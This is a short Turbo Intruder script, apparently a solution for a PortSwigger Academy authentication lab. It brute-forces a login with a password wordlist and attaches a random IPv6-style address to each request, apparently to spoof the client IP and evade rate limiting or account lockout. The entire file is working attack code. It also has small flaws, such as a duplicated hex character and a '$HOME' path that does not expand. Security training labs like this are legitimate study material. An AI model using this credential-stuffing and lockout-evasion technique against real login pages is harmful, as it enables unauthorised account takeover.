import random

passwords = []
with open("$HOME/Documents/Python/PortswiggerAcademyLabs/Authentication/password.txt", "r") as f:
    passwords = [x.strip() for x in f.readlines()]

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=500,
                           pipeline=False,
                           engine=Engine.THREADED,
                           timeout=20
                           )

    ip_char_list = '12344567890ABCDEF'

    for password in passwords:
        ip = '{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}:{}{}{}{}'.format(*[random.choice(ip_char_list) for _ in range(33)])
        engine.queue(target.req, [ip, password], label=password)




def handleResponse(req, interesting):
    table.add(req)
